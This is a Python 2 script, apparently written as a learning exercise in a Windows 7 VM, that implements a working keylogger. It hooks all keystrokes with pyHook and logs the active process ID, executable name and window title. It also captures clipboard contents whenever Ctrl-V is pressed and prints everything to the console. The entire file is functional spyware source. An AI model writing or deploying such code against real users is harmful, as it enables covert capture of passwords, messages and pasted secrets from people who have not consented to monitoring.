'''
pyHook is for 32 bits, so testing this in the Windows 7 VM
'''

from ctypes import *
import win32clipboard
import pyHook
import pythoncom


user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi # to get process information
current_window = None

def get_current_process():
    # get a handle to the foreground (active) window
    hwnd = user32.GetForegroundWindow()

    # find the process ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))
    # store the current process ID
    process_id = "%d" % pid.value

    executable_name = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process, None, byref(executable_name), 512)

    # now read its title
    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512) # what is this length variable? the actual content?

    # print out the header if we're in the right process
    print
    print "[ PID: %s - %s - %s " % (process_id, executable_name.value, window_title.value)
    print

    # close handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)


def KeyStroke(event):
    global current_window

    # check to see if the target changed windows
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()

    # if they pressed a standard key
    if event.Ascii > 32 and event.Ascii < 127:
        print chr(event.Ascii)
    else: # it's a modifier such as SIFT CTRL or ALT
        # if [Ctrl-V], get the value on the clipboard
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            print "[PASTE] - %s" % (pasted_value)
        else:
            print "[%s]" % event.Key

    # pass execution to next hook registered
    return True


# create and register a hook manager
kl = pyHook.HookManager()
# bind the KeyDown event to our user defined callback function KeyStroke
kl.KeyDown = KeyStroke

# register the hook and execute forever
kl.HookKeyboard()
pythoncom.PumpMessages()